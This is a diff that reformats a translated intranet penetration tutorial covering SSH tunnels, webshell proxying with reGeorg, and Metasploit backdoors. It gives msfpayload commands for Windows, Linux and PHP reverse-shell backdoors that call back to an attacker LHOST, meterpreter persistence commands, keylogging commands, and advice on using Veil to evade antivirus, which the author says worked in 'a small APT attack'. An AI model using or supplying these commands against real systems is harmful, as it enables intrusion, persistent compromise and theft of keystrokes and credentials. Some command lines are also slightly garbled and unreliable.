@@ -12,9 +12,10 @@ Intranet penetration definitely cannot be illustrated in one or two articles. Th
 # 01. intranet proxy and forwarding
 
 [Image: https://quip.com/-/blob/YCIAAADtDa5/gNFHcx2vzWIgLNvnX-JBYA]
-### the distinction between a forward proxy and a reverse proxy
 
-## 1.1the forward proxy 
+the distinction between a forward proxy and a reverse proxy
+
+## 1.1 the forward proxy 
 
 
     Lhost－－》proxy－－》Rhost
@@ -26,9 +27,7 @@ Under this method, Lhost typically would send a request targeting at the Rhost t
 
 ## 1.2 the reverse proxy (reverse proxy)
 
-```
-Lhost<--->proxy<--->firewall<--->Rhost 
-```
+    Lhost<--->proxy<--->firewall<--->Rhost
 
 
 
@@ -46,17 +45,25 @@ Many Zone users have asked a question [on using proxy to penetrate the intranet]
 
 This method requires a high(system/root) privilege using system functions to directly open the tunnel responsible for the intranet proxy. Other than that, it's simple to configure a VPN, so i won't detail much about this here. But we should focus more when using a SSH tunnel for proxy.
 
-```
--L port:host:user remote_ip # a forward tunnel to listen to local ports:host:user remote_ip #a reverse tunnel to penetrate the intranet and break firewall limits         SSH -qTfnN -D port remotehost #directly for socks proxy                                    details of parameters :   -q Quiet mode. Quiet mode-T Disable pseudo-tty allocation. Without shell-f Requests SSH to go to background just before command execution. Running in the background, and together with the-n parameter-N Do not execute a remote command. Does not execute a remote command, using it to forward a port ~ 
-```
+    #!bash
+    ssh -qTfnN -L port:host:hostport -l user remote_ip   #a forward tunnel to listen to local ports
+    ssh -qTfnN -R port:host:hostport -l user remote_ip   #a reverse tunnel to penetrate the intranet and break firewall limits
+    SSH -qTfnN -D port remotehost   #directly for socks proxy     
+    
+    details of parameters 
+    -q Quiet mode.  #Quiet mode.
+    -T Disable pseudo-tty allocation. # Without shell
+    -f Requests ssh to go to background just before command execution. #Running in the background, and together with the-n parameter
+    -N Do not execute a remote command. #Do not execute a remote command. Does not execute a remote command, using it to forward a port ~ 
 
 
 
 Sometimes as we have no appropriate tools to forward a port, it is possible to leverage SSH for port forwarding.
 
-```
--L port1:127.0.0.1:port2 port2:127.0.0.1:port1 user@host # user@host # local forwarding-r remote forwarding 
-```
+    #!bash
+    ssh -CfNg -L port1:127.0.0.1:port2 user@host    # local forwarding
+    ssh -CfNg -R port2:127.0.0.1:port1 user@host    # remote forwarding
+
 
 This excellent paper [SSH Port Forwarding](http://staff.washington.edu/corey/fw/ssh-port-forwarding.html) could be of great help.
 
@@ -64,13 +71,15 @@ This excellent paper [SSH Port Forwarding](http://staff.washington.edu/corey/fw/
 
 You just simply need to upload a Webshell on the target server, then forward all of the traffic to the intranet through the shell. Some popular tools include reGeorg,meterpreter,tunna and so on. Or even you can write a simple proxy script, and configure the nginx on your machine to conduct reverse proxy.
 
-* The instuction coming with [ReGeorg](https://github.com/sensepost/reGeorg)is clear enough:
-    * Step 1. Upload tunnel.(aspx|ashx|jsp|php) to a webserver (How you do that is up to you)
-    * Step 2. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py
+The instuction coming with [ReGeorg](https://github.com/sensepost/reGeorg)is clear enough:
 
-** Note, if your tools, such as NMap doesn't support socks proxies, use [proxychains] (see wiki)
+* Step 1. Upload tunnel.(aspx|ashx|jsp|php) to a webserver (How you do that is up to you)
 
-    * Step 3. Hack the planet :)
+* Step 2. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py
+
+Note, if your tools, such as NMap doesn't support socks proxies, use [proxychains] (see wiki)
+
+* Step 3. Hack the planet :)
 
 Note: install urllib3.(i mainly use regeorg, it's really convenient.)
 
@@ -86,15 +95,15 @@ msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your P
 
 ## 3.2 Linux backdoor
 
-```
-msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell 
-```
+
+    msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell 
+
 
 ## 3.3 PHP backdoor
 
-```
-msfpayload php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -e php/base64(can be simple codes) -t raw -o base64php.php 
-```
+
+    msfpayload php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -e php/base64(can be simple codes) -t raw -o base64php.php 
+
 
 MSF can do whatever things after the meterpreter session is captured. One of the most popular ways is to scan the target by using the attack module provided in msf (note: it can be a cross-network scan) after the routing table is added.
 
@@ -103,9 +112,9 @@ If you just want to perform a simple proxy work, auxiliary/server/socks4a module
 
 I'd like to add one thing about msf here. If you find it troublesome to memorize all that commands used in the SSH tunnel, you can also use msf to build the tunnel.
 
-```
-Load meta_ssh use multi/SSH/login_password exploit to get a session for proxy operations after the parameter is set  
-```
+    
+    Load meta_ssh use multi/SSH/login_password exploit to get a session for proxy operations after the parameter is set  
+
 
 * Directly conduct reverse proxy through WebShell and nginx
 
@@ -206,15 +215,15 @@ There are two kinds of sustainable msf backdoor:one starts through the service, 
 
 The one starts through the service has a shortage of showing its service name as meterpreter and it is used by : uploading the back door and leveraging metsvc to install the service
 
-```
-meterpreter > run metsvc ... (Set port, and upload back files) use Exploit/multi/handler set PAYLOAD Windows/metsvc_bind_tcp exploit 
-```
+
+    meterpreter > run metsvc ... (Set port, and upload back files) use Exploit/multi/handler set PAYLOAD Windows/metsvc_bind_tcp exploit 
+
 
 the other one can be used by :
 
-```
-meterpreter > run persistence -X -i 10 -p port -r hostip use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp exploit 
-```
+
+    meterpreter > run persistence -X -i 10 -p port -r hostip use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp exploit 
+
 
 Of course, directly generated backdoor may be killed, so I recommend a great tool here,[veil](https://github.com/ChrisTruncer/Veil). I have used this tool to generate the backdoor in a small APT attack and the backdoor successfully bypassed the 360AV.
 
@@ -232,9 +241,9 @@ I frequently use [Ixkeylog](https://github.com/dorneanu/ixkeylog/), compatible w
 
 Or you can use the key log function that comes with meterpreter session
 
-```
-keyscan_start keyscan_dump 
-```
+
+    keyscan_start keyscan_dump 
+
 
 [Image: https://quip.com/-/blob/YCIAAADtDa5/cRaYG1_jRlb3Y2Cs2Nn0Gw][Image: https://quip.com/-/blob/YCIAAADtDa5/PlSN9q1rPVvx8W0ZxbKwEQ]
 The benefit of Meterpreter is that meyerpreter can be injected in the memory in Windows without creating any process.
